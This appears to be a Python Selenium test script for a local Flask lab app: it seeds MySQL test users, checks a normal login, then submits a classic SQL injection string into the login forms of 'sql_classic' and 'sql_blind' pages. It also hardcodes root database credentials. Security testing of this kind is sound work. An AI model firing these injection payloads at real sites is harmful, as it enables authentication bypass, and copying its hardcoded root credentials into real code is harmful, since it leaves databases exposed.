from selenium.webdriver import Firefox
from selenium.webdriver.firefox.options import Options
from werkzeug.security import generate_password_hash, check_password_hash
import mysql.connector
import time

def get_hash(password):
    return generate_password_hash(password)
    
def getMysqlConnection():
    return mysql.connector.connect(user='root', host='172.17.0.1', port='33060', password='test123', database='mydb')

def initDB():
    connection = getMysqlConnection()
    cursor = connection.cursor()
    sql = "INSERT INTO `tmpUser` (`username`, `password`) VALUES (%s, %s)"
    pw_hash = get_hash('test')
    cursor.execute(sql, ('test123', pw_hash))
    cursor.execute(sql, ('admin', pw_hash))
    cursor.execute(sql, ('nick', pw_hash))
    cursor.execute(sql, ('drew', pw_hash))
    connection.commit()
    print("DB Added Users:test123, admin, nick, drew " + "password:" + pw_hash)
    cursor.close()
    connection.close()

def getlogin(firefox):
    firefox.get('http://localhost:5000/login') # test against flask app
    user = firefox.find_element_by_name('username')
    user.send_keys('test123')
    password = firefox.find_element_by_name('password')
    password.send_keys('test')
    loginbtn = firefox.find_element_by_id('Login')
    loginbtn.click()
    time.sleep(5)
    if "Main Page" in firefox.page_source:
        print("Success Caught: Valid User Login!")
    else:
        print("Error Caught: User was not able to login...")
    return firefox

def classic(firefox):
    firefox.get('http://localhost:5000/sql_classic') # test against flask app
    print("Tyring to perform classic SQL Injection..")
    user = firefox.find_element_by_name('username')
    user.send_keys('" or ""="')
    password = firefox.find_element_by_name('password')
    password.send_keys('" or ""="')
    loginbtn = firefox.find_element_by_id('Login')
    loginbtn.click()
    time.sleep(5)
    #print(firefox.page_source)
    if "Unread result found" in firefox.page_source:
        print("Success Caught: Valid SQL Injection")
    return firefox

def blind(firefox):
    firefox.get('http://localhost:5000/sql_blind') # test against flask app
    print("Tyring to perform blind SQL Injection..")
    user = firefox.find_element_by_name('username')
    user.send_keys('" or ""="')
    password = firefox.find_element_by_name('password')
    password.send_keys('" or ""="')
    loginbtn = firefox.find_element_by_id('Login')
    loginbtn.click()    
    time.sleep(5)
    #print(firefox.page_source)
    if "Unread result found" in firefox.page_source:
        print("Success Caught: Valid SQL blind")
    return firefox

def main():
    initDB()
    options = Options() # get firefox webdriver options
    options.add_argument('-headless') # run tests in headless mode CMD
    firefox = Firefox(firefox_options=options) # intialize firefox web driver
    firefox = getlogin(firefox)
    firefox = classic(firefox)
    firefox = blind(firefox)
    firefox.close()

if __name__ == "__main__":
    main()